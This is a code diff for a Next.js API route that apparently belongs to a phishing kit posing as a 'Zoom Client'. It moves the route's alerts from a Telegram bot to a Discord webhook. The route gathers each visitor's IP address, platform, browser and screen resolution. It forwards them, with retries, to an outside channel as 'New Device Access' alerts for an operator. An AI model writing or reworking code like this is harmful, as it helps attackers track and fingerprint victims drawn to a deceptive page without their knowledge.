@@ -1,12 +1,12 @@
 import { NextResponse } from "next/server";
 
-async function sendTelegramMessage(telegramUrl, payload, retries = 3, delay = 5000) {
+async function sendDiscordMessage(webhookUrl, payload, retries = 3, delay = 5000) {
   for (let i = 0; i < retries; i++) {
     try {
       const controller = new AbortController();
       const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout
 
-      const res = await fetch(telegramUrl, {
+      const res = await fetch(webhookUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
@@ -16,10 +16,18 @@ async function sendTelegramMessage(telegramUrl, payload, retries = 3, delay = 50
       clearTimeout(timeoutId);
 
       if (!res.ok) {
-        throw new Error(`Telegram API Error: ${res.status} - ${await res.text()}`);
+        throw new Error(`Discord webhook error: ${res.status} - ${await res.text()}`);
       }
 
-      return await res.json();
+      if (res.status === 204) {
+        return null;
+      }
+
+      try {
+        return await res.json();
+      } catch {
+        return null;
+      }
     } catch (error) {
       console.error(`Retry ${i + 1}/${retries} failed:`, error);
       if (i < retries - 1) {
@@ -27,7 +35,7 @@ async function sendTelegramMessage(telegramUrl, payload, retries = 3, delay = 50
       }
     }
   }
-  throw new Error("Failed to send message to Telegram after multiple attempts.");
+  throw new Error("Failed to send message to Discord after multiple attempts.");
 }
 
 export async function POST(req) {
@@ -47,19 +55,32 @@ export async function POST(req) {
 
     const message = `🧛‍♂️ *Root*\n📢 *New Device Access*\n*Zoom Client*\n\n🌍 IP: ${ip}\n🖥 Platform: ${platform}\n🌐 Browser: ${browser}\n📏 Resolution: ${screenWidth}x${screenHeight}`;
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
-    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 
-    console.log("📡 Sending to Telegram...", { botToken, chatId });
+    if (!webhookUrl) {
+      console.error("Missing DISCORD_WEBHOOK_URL. Cannot forward device info.");
+      return NextResponse.json(
+        { error: "Missing DISCORD_WEBHOOK_URL environment variable" },
+        { status: 500 }
+      );
+    }
 
-    const data = await sendTelegramMessage(telegramUrl, { chat_id: chatId, text: message, parse_mode: "Markdown" });
+    console.log("📡 Sending to Discord webhook...");
 
-    console.log("🔄 Telegram API Response:", data);
+    const data = await sendDiscordMessage(webhookUrl, {
+      content: message,
+      allowed_mentions: { parse: [] },
+    });
 
-    return NextResponse.json({ success: true, message: "Device info sent to Telegram" }, { status: 200 });
+    if (data) {
+      console.log("🔄 Discord webhook response:", data);
+    } else {
+      console.log("🔄 Discord webhook acknowledged (no response body).");
+    }
+
+    return NextResponse.json({ success: true, message: "Device info sent to Discord" }, { status: 200 });
   } catch (error) {
-    console.error("❌ Error in Telegram route:", error);
+    console.error("❌ Error in Discord webhook route:", error);
     return NextResponse.json({ error: error.message }, { status: 500 });
   }
 }
